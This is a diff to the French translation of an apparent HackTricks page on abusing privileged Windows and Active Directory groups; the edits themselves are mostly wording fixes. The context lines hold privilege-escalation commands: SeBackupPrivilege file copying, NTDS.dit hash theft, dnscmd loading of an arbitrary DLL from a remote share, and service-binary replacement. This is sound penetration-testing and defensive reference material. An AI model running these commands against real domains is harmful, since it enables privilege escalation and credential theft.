@@ -8,8 +8,8 @@ Autres façons de soutenir HackTricks :
 
 * Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) dépôts GitHub.
 
 </details>
@@ -58,7 +58,7 @@ L'accès aux fichiers sur le DC est restreint sauf si l'utilisateur fait partie 
 
 ### Élévation de privilèges
 
-En utilisant `PsService` ou `sc` de Sysinternals, on peut inspecter et modifier les autorisations de service. Le groupe `Opérateurs de serveurs`, par exemple, a un contrôle total sur certains services, permettant l'exécution de commandes arbitraires et l'élévation de privilèges:
+En utilisant `PsService` ou `sc` de Sysinternals, on peut inspecter et modifier les autorisations des services. Le groupe `Opérateurs de serveurs`, par exemple, a un contrôle total sur certains services, permettant l'exécution de commandes arbitraires et l'élévation de privilèges:
 ```cmd
 C:\> .\PsService.exe security AppReadiness
 ```
@@ -81,7 +81,7 @@ Pour exploiter ces privilèges localement, les étapes suivantes sont utilisées
 Import-Module .\SeBackupPrivilegeUtils.dll
 Import-Module .\SeBackupPrivilegeCmdLets.dll
 ```
-2. Activer et vérifier `SeBackupPrivilege`:
+2. Activer et vérifier `SeBackupPrivilege` :
 ```bash
 Set-SeBackupPrivilege
 Get-SeBackupPrivilege
@@ -93,7 +93,7 @@ Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Over
 ```
 ### Attaque AD
 
-Un accès direct au système de fichiers du contrôleur de domaine permet de voler la base de données `NTDS.dit`, qui contient tous les hachages NTLM des utilisateurs et des ordinateurs du domaine.
+Un accès direct au système de fichiers du contrôleur de domaine permet le vol de la base de données `NTDS.dit`, qui contient tous les hachages NTLM des utilisateurs et des ordinateurs du domaine.
 
 #### Utilisation de diskshadow.exe
 
@@ -148,9 +148,9 @@ Pour lister les membres du groupe DnsAdmins, utilisez :
 ```powershell
 Get-NetGroupMember -Identity "DnsAdmins" -Recurse
 ```
-### Exécuter une DLL arbitraire
+### Exécuter un DLL arbitraire
 
-Les membres peuvent faire charger au serveur DNS une DLL arbitraire (soit localement, soit à partir d'un partage distant) en utilisant des commandes telles que :
+Les membres peuvent faire charger au serveur DNS un DLL arbitraire (soit localement, soit à partir d'un partage distant) en utilisant des commandes telles que :
 ```powershell
 dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
 dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
@@ -190,7 +190,7 @@ Les membres peuvent accéder aux journaux d'événements, trouvant potentielleme
 Get-NetGroupMember -Identity "Event Log Readers" -Recurse
 Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
 ```
-## Autorisations Windows Exchange
+## Permissions Windows Exchange
 Ce groupe peut modifier les DACL sur l'objet de domaine, potentiellement accordant des privilèges DCSync. Les techniques d'escalade de privilèges exploitant ce groupe sont détaillées dans le dépôt GitHub Exchange-AD-Privesc.
 ```powershell
 # List members
@@ -200,26 +200,28 @@ Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
 Les administrateurs Hyper-V ont un accès complet à Hyper-V, ce qui peut être exploité pour prendre le contrôle des contrôleurs de domaine virtualisés. Cela inclut le clonage des DC en direct et l'extraction des hachages NTLM du fichier NTDS.dit.
 
 ### Exemple d'exploitation
-Le service de maintenance de Mozilla Firefox peut être exploité par les administrateurs Hyper-V pour exécuter des commandes en tant que SYSTEM. Cela implique la création d'un lien dur vers un fichier SYSTEM protégé et de le remplacer par un exécutable malveillant:
+Le service de maintenance Mozilla de Firefox peut être exploité par les administrateurs Hyper-V pour exécuter des commandes en tant que SYSTEM. Cela implique la création d'un lien dur vers un fichier SYSTEM protégé et de le remplacer par un exécutable malveillant:
 ```bash
 # Take ownership and start the service
 takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
 sc.exe start MozillaMaintenance
 ```
+Note : L'exploitation des liens physiques a été atténuée dans les mises à jour récentes de Windows.
+
 ## Gestion de l'organisation
 
-Dans les environnements où **Microsoft Exchange** est déployé, un groupe spécial appelé **Organization Management** détient des capacités significatives. Ce groupe est autorisé à **accéder aux boîtes aux lettres de tous les utilisateurs du domaine** et maintient un **contrôle total sur l'Unité d'Organisation 'Microsoft Exchange Security Groups'**. Ce contrôle inclut le groupe **`Exchange Windows Permissions`**, qui peut être exploité pour l'élévation de privilèges.
+Dans les environnements où **Microsoft Exchange** est déployé, un groupe spécial appelé **Organization Management** détient des capacités significatives. Ce groupe est autorisé à **accéder aux boîtes aux lettres de tous les utilisateurs du domaine** et maintient un **contrôle total sur l'Unité d'organisation 'Microsoft Exchange Security Groups'**. Ce contrôle inclut le groupe **`Exchange Windows Permissions`**, qui peut être exploité pour l'élévation de privilèges.
 
 ### Exploitation des privilèges et commandes
 
 #### Opérateurs d'impression
-Les membres du groupe **Print Operators** sont dotés de plusieurs privilèges, y compris le **`SeLoadDriverPrivilege`**, qui leur permet de **se connecter localement à un Contrôleur de Domaine**, de l'éteindre et de gérer les imprimantes. Pour exploiter ces privilèges, en particulier si le **`SeLoadDriverPrivilege`** n'est pas visible dans un contexte non élevé, il est nécessaire de contourner le Contrôle de compte d'utilisateur (UAC).
+Les membres du groupe **Print Operators** sont dotés de plusieurs privilèges, y compris le **`SeLoadDriverPrivilege`**, qui leur permet de **se connecter localement à un contrôleur de domaine**, de l'éteindre et de gérer les imprimantes. Pour exploiter ces privilèges, en particulier si le **`SeLoadDriverPrivilege`** n'est pas visible dans un contexte non élevé, il est nécessaire de contourner le Contrôle de compte d'utilisateur (UAC).
 
-Pour lister les membres de ce groupe, la commande PowerShell suivante est utilisée:
+Pour lister les membres de ce groupe, la commande PowerShell suivante est utilisée :
 ```powershell
 Get-NetGroupMember -Identity "Print Operators" -Recurse
 ```
-Pour des techniques d'exploitation plus détaillées liées au **`SeLoadDriverPrivilege`**, il convient de consulter des ressources de sécurité spécifiques.
+Pour des techniques d'exploitation plus détaillées liées à **`SeLoadDriverPrivilege`**, il convient de consulter des ressources de sécurité spécifiques.
 
 #### Utilisateurs du Bureau à distance
 Les membres de ce groupe ont accès aux PC via le protocole Bureau à distance (RDP). Pour énumérer ces membres, des commandes PowerShell sont disponibles :
@@ -268,7 +270,7 @@ Autres façons de soutenir HackTricks:
 * Si vous souhaitez voir votre **entreprise annoncée dans HackTricks** ou **télécharger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
+* **Rejoignez le** 💬 [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
